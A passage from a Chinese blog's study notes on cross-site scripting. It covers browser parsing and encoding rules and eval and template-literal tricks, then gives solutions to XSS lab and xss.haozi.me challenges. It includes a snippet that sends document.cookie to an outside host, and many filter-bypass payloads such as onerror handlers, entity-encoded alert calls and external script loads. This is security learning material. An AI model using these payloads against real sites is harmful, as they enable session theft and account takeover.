不能对协议类型进行任何的编码操作&#x27;</span><br><span class=\"line\">    Unicode转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>总结：</p>\n<p>浏览器解析顺序：URL 解析器 -&gt;HTML 解析器 -&gt; CSS 解析器 -&gt;JS 解析器</p>\n<p>不能对协议进行编码 javascript:   (包含：)</p>\n<h3 id=\"html解析\"><a class=\"markdownIt-Anchor\" href=\"#html解析\">#</a> HTML 解析</h3>\n<p>一个 HTML 解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个’&lt;‘符号（后面没有跟’/' 符号）就会进入 <code>“标签开始状态(Tag open state)”</code> 。然后转变到 <code>“标签名状态(Tag name state)”</code> ， <code>“前属性名状态(before attribute name state)”</code> … 最后进入 <code>“数据状态(Data state)”</code>  并释放当前标签的 token。当解析器处于 “数据状态 (Data state)” 时，它会继续解析，每当发现一个完整的标签，就会释放出一个 token。</p>\n<p>在 HTML 中有五类元素：</p>\n<ol>\n<li>\n<p>空元素 (Void elements)，如 <code>&lt;area&gt;</code> , <code>&lt;base&gt;</code>  等等</p>\n</li>\n<li>\n<p>原始文本元素 (Raw text elements)，有 script 和 style</p>\n</li>\n<li>\n<p>RCDATA 元素 (RCDATA elements)，有 <code>&lt;textarea&gt;</code>  和 <code>&lt;title&gt;</code></p>\n</li>\n<li>\n<p>外部元素 (Foreign elements)，例如 MathML 命名空间或者 SVG 命名空间的元素</p>\n</li>\n<li>\n<p>基本元素 (Normal elements)，即除了以上 4 种元素以外的元素</p>\n</li>\n</ol>\n<p>五类元素的区别如下：</p>\n<ol>\n<li>\n<p>空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。</p>\n</li>\n<li>\n<p>原始文本元素，可以容纳文本。</p>\n</li>\n<li>\n<p>RCDATA 元素，可以容纳文本和字符引用。</p>\n</li>\n<li>\n<p>外部元素，可以容纳文本、字符引用、CDATA 段、其他元素和注释</p>\n</li>\n<li>\n<p>基本元素，可以容纳文本、字符引用、其他元素和注释</p>\n</li>\n</ol>\n<p>如果我们回头看 HTML 解析器的规则，其中有一种可以容纳字符引用的情况是 “RCDATA 状态中的字符引用”。这意味着在 <code>&lt;textarea&gt;</code>  和 <code>&lt;title&gt;</code>  标签中的字符引用会被 HTML 解析器解码。这里要再提醒一次，在解析这些字符引用的过程中不会进入 “标签开始状态”。这样就可以解释问题 5 了。另外，对 RCDATA 有个特殊的情况。在浏览器解析 RCDATA 元素的过程中，解析器会进入 “RCDATA 状态”。在这个状态中，如果遇到 “&lt;” 字符，它会转换到 “RCDATA 小于号状态”。如果 “&lt;” 字符后没有紧跟着 “/” 和对应的标签名，解析器会转换回 “RCDATA 状态”。这意味着在 RCDATA 元素标签的内容中（例如 <code>&lt;textarea&gt;</code>  或 <code>&lt;title&gt;</code>  的内容中），唯一能够被解析器认做是标签的就是 “ <code>&lt;/textarea&gt;</code> ” 或者 “ <code>&lt;/title&gt;</code> ”。因此，在 “ <code>&lt;textarea&gt;</code> ” 和 “ <code>&lt;title&gt;</code> ” 的内容中不会创建标签，就不会有脚本能够执行。这也就解释了为什么问题 6 中的脚本不会被执行。</p>\n<h3 id=\"url解析\"><a class=\"markdownIt-Anchor\" href=\"#url解析\">#</a> URL 解析</h3>\n<p>首先，URL 资源类型必须是 ASCII 字母（U+0041-U+005A || U+0061-U+007A），不然就会进入 “无类型” 状态。例如， <code>你不能对协议类型进行任何的编码操作</code> ，不然 URL 解析器会认为它无类型。这就是为什么问题 1 中的代码不能被执行。因为 URL 中被编码的 “javascript” 没有被解码，因此不会被 URL 解析器识别。该原则对协议后面的 “：”（冒号）同样适用，即问题 3 也得到解答。然而，你可能会想到：为什么问题 2 中的脚本被执行了呢？如果你记得我们在 HTML 解析部分讨论的内容的话，是否还记得有一个情况叫做 “属性值中的字符引用”，在这个情况中字符引用会被解码。我们将稍后讨论解析顺序，但在这里，HTML 解析器解析了文档，创建了标签 token，并且对 href 属性里的字符实体进行了解码。然后，当 HTML 解析器工作完成后，URL 解析器开始解析 href 属性值里的链接。在这时，“javascript” 协议已经被解码，它能够被 URL 解析器正确识别。然后 URL 解析器继续解析链接剩下的部分。由于是 “javascript” 协议，JavaScript 解析器开始工作并执行这段代码，这就是为什么问题 2 中的代码能够被执行。</p>\n<h3 id=\"javascript解析\"><a class=\"markdownIt-Anchor\" href=\"#javascript解析\">#</a> JavaScript 解析</h3>\n<p>那像 “\\uXXXX”（例如 \\u0000,\\u000A）这样的字符呢，JavaScript 会解析这些字符来执行吗？简单的说：视情况而定。具体的说就是要看被编码的序列到底是哪部分。首先，像 \\uXXXX 一样的字符被称作 Unicode 转义序列。从上下文来看，你可以将转义序列放在 3 个部分：字符串中，标识符名称中和控制字符中。</p>\n<p>字符串中：当 Unicode 转义序列存在于字符串中时，它只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。这项内容清楚地写在 ECMAScript 中。因此，Unicode 转义序列将永远不会破环字符串上下文，因为它们只能被解释成字符串常量。</p>\n<p>标识符名称中：当 Unicode 转义序列出现在标识符名称中时，它会被解码并解释为标识符名称的一部分，例如函数名，属性名等等。这可以用来解释问题 10。如果我们深入研究 JavaScript 细则，可以看到如下内容：</p>\n<p>“Unicode 转义序列（如 \\u000A\\u000B）同样被允许用在标识符名称中，被当作名称中的一个字符。而将’' 符号前置在 Unicode 转义序列串（如 \\u000A000B000C）并不能作为标识符名称中的字符。将 Unicode 转义序列串放在标识符名称中是非法的。”</p>\n<p>总的来说，Unicode 转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。如果我们回看问题 11，它并不会被执行。因为 “(11)” 不会被正确的解析，而 “alert (11)” 也不是一个有效的标识符名称。问题 12 不会被正确执行要么是因为’\\u0031\\u0032’不会被解释为字符串常量（因为它们没有用引号闭合）要么是因为它们是 ASCII 型数字。问题 13 不会执行的原因是’\\u0027’仅仅会被解释成单引号文本，而此时字符串是未闭合的。问题 14 能够执行的原因是’\\u000a’会被解释成换行符文本，这并不会导致真正的换行从而引发 JavaScript 语法错误。</p>\n<p>即 () 和 里面的东西都不能编码</p>\n<h2 id=\"xss攻击方式\"><a class=\"markdownIt-Anchor\" href=\"#xss攻击方式\">#</a> XSS 攻击方式</h2>\n<h3 id=\"1读取浏览器cookie对象发起cookie劫持\"><a class=\"markdownIt-Anchor\" href=\"#1读取浏览器cookie对象发起cookie劫持\">#</a> 1. 读取浏览器 cookie 对象，发起 cookie 劫持</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var img = document.createElement(&quot;img&quot;);</span><br><span class=\"line\">img.src = &quot;http://www.eval.com/log?&quot; + escape(document.cookie);</span><br><span class=\"line\">document.body.append(img);</span><br></pre></td></tr></table></figure>\n<p>使用 httponly 标识可以防止 cookie 劫持</p>\n<h3 id=\"2模拟postget请求操作用户的浏览器\"><a class=\"markdownIt-Anchor\" href=\"#2模拟postget请求操作用户的浏览器\">#</a> 2. 模拟 POST，GET 请求操作用户的浏览器</h3>\n<p>在 cookie 劫持失效时或是在目标用户的网络不能访问互联网时</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.抓包分析浏览器发送的请求</span><br><span class=\"line\">2.构造完整url，使用XMLHTTPRequest或者form表单请求此url</span><br></pre></td></tr></table></figure>\n<h3 id=\"3xss钓鱼\"><a class=\"markdownIt-Anchor\" href=\"#3xss钓鱼\">#</a> 3.XSS 钓鱼</h3>\n<p>通过伪造登录框获取用户的用户名和密码，在将密码和用户名发送到自己服务器上</p>\n<h3 id=\"4获取用户信息\"><a class=\"markdownIt-Anchor\" href=\"#4获取用户信息\">#</a> 4. 获取用户信息</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.识别用户浏览器，根据每个浏览器特有的功能</span><br><span class=\"line\">2.识别用户安装的软件或浏览器插件</span><br><span class=\"line\">3.查询用户访问过的连接</span><br><span class=\"line\">4.获取用户真实IP</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"xsslab\"><a class=\"markdownIt-Anchor\" href=\"#xsslab\">#</a> XSSlab</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veHl6MzE1L3AvMTQ4NTAzNTkuaHRtbA==\">https://www.cnblogs.com/xyz315/p/14850359.html</span></p>\n<p>Level - 1</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//192.168.1.6:18888/xss/level1.php?name=test</span></span><br><span class=\"line\"></span><br><span class=\"line\">?name=&lt;script&gt;<span class=\"title function_ invoke__\">alert</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">?name=&lt;input onclick/onmouseover&gt;</span><br><span class=\"line\">?name=&lt;a onclick/javascript&gt;</span><br><span class=\"line\">?name=&lt;img src&gt;</span><br><span class=\"line\">?name=&lt;iframe&gt;</span><br><span class=\"line\">?name=&lt;svg&gt;</span><br><span class=\"line\">?name=&lt;video onloadstart=<span class=\"title function_ invoke__\">alert</span>(<span class=\"number\">1</span>) src=<span class=\"string\">&quot;/media/hack-the-plant.mp4&quot;</span>&gt;</span><br></pre></td></tr></table></figure>\n<p>闭合 大小写 双写 编码</p>\n<p>Level 10</p>\n<p>?keyword=111&amp;t_sort=1 type=“text” onclick=alert(1)</p>\n<p>?keyword=111&amp;t_sort=1 type=“text” onfocus=alert(1) autofocus=&quot;true</p>\n<p>Level 11</p>\n<p>Post 提交 referer</p>\n<h2 id=\"模板字符串\"><a class=\"markdownIt-Anchor\" href=\"#模板字符串\">#</a> 模板字符串</h2>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//弹窗，因为有tostring方法，把数组中第一个参数转为字符串</span></span><br><span class=\"line\">alert<span class=\"string\">`a`</span></span><br><span class=\"line\"><span class=\"literal\">undefined</span>    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，因为有$&#123;&#125;执行表达式</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`<span class=\"subst\">$&#123;alert(<span class=\"number\">1</span>)&#125;</span>`</span></span><br><span class=\"line\">(<span class=\"number\">2</span>) [<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，相当于2前后加了个字符串</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`a<span class=\"subst\">$&#123;alert(<span class=\"number\">1</span>)&#125;</span>b`</span></span><br><span class=\"line\">(<span class=\"number\">2</span>) [<span class=\"string\">&#x27;a&#x27;</span>, <span class=\"string\">&#x27;b&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//不弹，因为没有tostring，会放在数组中输出</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`a`</span></span><br><span class=\"line\">[<span class=\"string\">&#x27;a&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">1</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//不弹，和上一条一样</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`alert(1)`</span></span><br><span class=\"line\">[<span class=\"string\">&#x27;alert(1)&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">1</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，和3一样</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`alert(1) <span class=\"subst\">$&#123;alert(<span class=\"number\">1</span>)&#125;</span>`</span></span><br><span class=\"line\">(<span class=\"number\">2</span>) [<span class=\"string\">&#x27;alert(1) &#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，此时不是模板字符串，是函数</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"title function_\">alert</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//不弹，虽然有$&#123;&#125;执行表达式，但此时alert是字符串</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"string\">&#x27;alert(1)&#x27;</span>&#125;</span>`</span></span><br><span class=\"line\">[<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//不弹，虽然可以字符串中解析16进制和Unicode，但此时解析完后仍然为字符串</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"string\">&#x27;alert\\x281\\x29&#x27;</span>&#125;</span>`</span></span><br><span class=\"line\">[<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//上面都是先解析$&#123;&#125;，最后在解析eval</span></span><br><span class=\"line\"><span class=\"comment\">//对于call方法</span></span><br><span class=\"line\"><span class=\"comment\">//弹窗</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"string\">&#x27;alert(1)&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，此时相当于eval(&#x27;alert(1)&#x27;),call相当于将eval内的执行</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span>.<span class=\"property\">call</span><span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"string\">&#x27;alert\\x281\\x29&#x27;</span>&#125;</span>`</span></span><br><span class=\"line\"><span class=\"literal\">undefined</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，前面的eval相当于tag，模板字符串前可以有tag，注意返回值的不同，此时返回的不是数组 </span></span><br><span class=\"line\"><span class=\"string\">`aaa <span class=\"subst\">$&#123;alert<span class=\"string\">`1`</span>&#125;</span> bbbb`</span></span><br><span class=\"line\"><span class=\"string\">&#x27;aaa undefined bbbb&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//报错，不能对符号编码，因此的prompt不是字符串</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`<span class=\"subst\">$&#123;prompt\\x281\\x29&#125;</span>`</span></span><br><span class=\"line\"><span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">//弹窗</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span>$&#123;<span class=\"title function_\">prompt</span>(<span class=\"number\">1</span>)&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">undefined</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//弹窗</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span>aaa$&#123;<span class=\"title function_\">prompt</span>(<span class=\"number\">1</span>)&#125;bbb<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">undefined</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//不弹</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span><span class=\"title function_\">alert</span>(<span class=\"number\">1</span>)<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">undefined</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//弹窗</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span>$&#123;<span class=\"title function_\">alert</span>(<span class=\"number\">1</span>)&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">undefined</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//如果aaaa全局有定义返回变量对应的值，没有定义则not define 报错</span></span><br><span class=\"line\"><span class=\"string\">eval(&#x27;aaaa&#x27;)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//返回[&quot;aaaaaaaaa&quot;]</span></span><br><span class=\"line\"><span class=\"string\">eval([&quot;aaaaaaaaa&quot;]);</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//eval只能接收第一个参数的值，他只有一个参数</span></span><br><span class=\"line\"><span class=\"string\">eval`</span>$&#123;<span class=\"title function_\">prompt</span>(<span class=\"number\">1</span>)&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">[&#x27;&#x27;, &#x27;&#x27;, raw: Array(2)]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//`</span><span class=\"string\">`两端字符串依然为空，但中间是一个字符串不是函数，此时第二个参数为&#x27;prompt(1)&#x27;,但eval不接</span></span><br><span class=\"line\"><span class=\"string\">eval`</span>$&#123;<span class=\"string\">&#x27;prompt(1)&#x27;</span>&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">[&#x27;&#x27;, &#x27;&#x27;, raw: Array(2)]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//输入11111,打印11111.&#123;&#125;首先执行，返回([&quot;&quot;,&quot;&quot;],&#x27;prompt(1)&#x27;),此时数组为空，即第一个参数为空，那么call指向全局对象，全局对象window中有prompt函数，执行eval(&#x27;prompt(1)&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">eval(&#x27;prompt(1)&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">&#x27;11111&#x27;</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span>$&#123;<span class=\"string\">&#x27;prompt(1)&#x27;</span>&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">&#x27;11111&#x27;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//输入aaaa,打印aaaa undefined.&#123;&#125;首先执行，返回([&quot;&quot;,&quot;&quot;],&#x27;prompt(1)&#x27;),此时数组为空，即第一个参数为空，那么call指向全局对象，全局对象没有aaaa方法，返回undefined,但注意如果输入为数字那么原样返回</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span>$&#123;<span class=\"title function_\">prompt</span>(<span class=\"number\">1</span>)&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">Uncaught ReferenceError: aaaa is not defined</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//eval别名调用，指向全局变量，因为js不允许指向prompt.第二个参数没传值，因此返回undefined</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span><span class=\"title function_\">prompt</span>(<span class=\"number\">1</span>)<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">undefined</span></span><br></pre></td></tr></table></figure>\n<p>模板字符串中需要有表达式 ${} 才能执行 eval``</p>\n<p>eval () 是个函数，会将传入的字符串当做代码执行，如果全局没有该字符串变量，会报错 undefined，如果传入的不是字符串，eval 会将参数直接返回</p>\n<p>alert 有 tostring 方法，将数字专为字符串执行</p>\n<p>eval 没有 tostring，将数字放入数组中</p>\n<p>模板字符串可以解析 16 进制和 Unicode</p>\n<p>call 用来改变 this 指向</p>\n<h2 id=\"httpsxsshaozime\"><a class=\"markdownIt-Anchor\" href=\"#httpsxsshaozime\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly94c3MuaGFvemkubWUv\">https://xss.haozi.me/</span></h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDA3NzU0NC9hcnRpY2xlL2RldGFpbHMvOTUwOTQ3NTk=\">https://blog.csdn.net/weixin_44077544/article/details/95094759</span></p>\n<p>0x03</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a href=&quot;javascript:alert&amp;#40;1&amp;#41;&quot;&gt;aaa</span><br><span class=\"line\">&lt;img src=1 onerror=&quot;alert`1`&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>0x05</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--!&gt;&lt;script&gt;alert(1)&lt;/script&gt; &lt;--!</span><br></pre></td></tr></table></figure>\n<p>0x06</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">onclick</span><br><span class=\"line\">=alert(1)</span><br><span class=\"line\"></span><br><span class=\"line\">type=&quot;image&quot; src=1 onerror=</span><br><span class=\"line\">alert(1)</span><br></pre></td></tr></table></figure>\n<p>0x07</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&#x27;1&#x27; onerror=&#x27;alert(1)&#x27;//</span><br></pre></td></tr></table></figure>\n<p>0x08</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;/style</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&lt;script&gt;alert(1)</span><br></pre></td></tr></table></figure>\n<p>0x09</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=https://www/segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)//</span><br></pre></td></tr></table></figure>\n<p>0x0A</p>\n<p>只有 Firefox 可以进行跳转</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.segmentfault.com@xss.haozi.com/j.js</span><br></pre></td></tr></table></figure>\n<p>http/https @ 会匹配后面一个并进行重定向</p>\n<p>ftp @前是用户名，后是 password</p>\n<p>0x0B</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=1 onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</span><br><span class=\"line\">&lt;img src=1 onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&quot;&gt;</span><br><span class=\"line\">&lt;svg/onload=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</span><br><span class=\"line\">&lt;svg/onload=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&quot;&gt;</span><br><span class=\"line\">&lt;scripscriptt src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/scripscriptt&gt;</span><br><span class=\"line\">&lt;cript src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/cript&gt;</span><br></pre></td></tr></table></figure>\n<p>0x0C</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">同0x0B</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>0x0D</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">111</span><br><span class=\"line\">alert(1)</span><br><span class=\"line\">--&gt; </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220912152740785.png\" alt=\"image-20220912152740785\"></p>\n<p>0x0E</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ſ用在有转大写时</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;ſcript src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/ſcript&gt;</span><br><span class=\"line\">&lt;ſvg onload=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>0x0F</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;);alert(1)//</span><br></pre></td></tr></table></figure>\n<p>0x10</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span 